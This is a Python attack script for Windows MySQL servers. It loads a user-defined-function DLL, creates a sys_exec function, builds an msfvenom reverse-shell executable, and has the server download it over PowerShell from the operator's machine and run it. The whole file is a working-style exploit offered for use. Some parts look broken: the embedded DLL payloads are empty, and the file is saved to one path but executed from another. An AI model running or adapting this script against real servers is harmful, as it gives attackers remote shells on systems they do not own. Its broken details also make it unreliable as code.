import mysql.connector
import random
import os
import time
import argparse

# UDF libs: https://github.com/rapid7/metasploit-framework/files/1879611/mysql_udf_libs.zip

print("MySQL Windows UDF exploit.\nNote: run a netcat listener and set up a web server in the current directory before running.")

parser = argparse.ArgumentParser(description='Exploit MySQL with user-defined functions.')
parser.add_argument('-r', '--RHOST', help='Remote IP where the SQL db lives.')
parser.add_argument('-u', dest='user', help='The MySQL user.', required=True)
parser.add_argument('-p', dest='password', help='The MySQL password.', required=True)
parser.add_argument('-a', dest='architecture', help='OS architecture: x86 or x64.', default='x64')
parser.add_argument('-l', '--lhost', dest='lhost', help='Your IP.', required=True)
parser.add_argument('-lp', '--lport', dest='lport', help="Port you're listening on.", required=True)

args = parser.parse_args()


mydb = mysql.connector.connect(
    host = args.RHOST,
    user = args.user,
    password = args.password
)

cursor = mydb.cursor(buffered=True)

# Clear sys_exec from any previous attempts.
cursor.execute("drop function if exists sys_exec")

# Generate a random name for the shared library
dllName = ""

for _ in range(10):
    random_integer = random.randint(97, 97+26-1)
    flip_bit = random.randint(0,1)
    random_integer = random_integer - 32 if flip_bit == 1 else random_integer
    dllName += (chr(random_integer))
   

if args.architecture == 'x64':
    # Load a base64-encoded payload of the 64-bit DLL into the plugins dir.
    # Get this payload from the actual DLL with:
    # cat lib_mysqludf_sys_64.dll | base64 -w 0 > b64-dll
    sql = f"select from_base64('') into dumpfile 'C:/xampp/mysql/lib/plugin/{dllName}.dll'"
    cursor.execute(sql)
    print("[*] 64-bit architecture selected. Payload: lib_mysqludf_sys_64.dll")
elif args.architecture == 'x86':
    sql = f"select from_base64('') into dumpfile 'C:/xampp/mysql/lib/plugin/{dllName}.dll'"
    cursor.execute(sql)
    print("[*] 32-bit architecture selected. Payload: lib_mysqludf_sys_32.dll")

print(f"[*] DLL {dllName} loaded.")
print("[*] Attempting to create function...")

# Create sys_exec function:
sql = f"CREATE FUNCTION sys_exec RETURNS integer SONAME '{dllName}.dll'"
cursor.execute(sql)
print(f"[*] Function successfully created. Generating msfvenom payload...")

# Generate reverse shell payload:
os.system(f'msfvenom -p windows/{args.architecture}/shell_reverse_tcp LHOST={args.lhost} LPORT={args.lport} EXITFUNC=thread -f exe > rev.exe')

print(f"[*] Attempting to download reverse shell.")
sql = f"select sys_exec('powershell -ep bypass -windowstyle hidden IEX(New-Object System.Net.WebClient).DownloadFile(\"http://{args.lhost}/rev.exe\", \"C:/Windows/Tasks/rev.exe\")')"
cursor.execute(sql)

print(f"[*] Payload uploaded. Attempting to execute...")
# Run the payload
sql = "select sys_exec('C:/xampp/mysql/data/rev.exe')"
print(f"[+++] Exploit completed. Enjoy your shell.")
cursor.execute(sql)
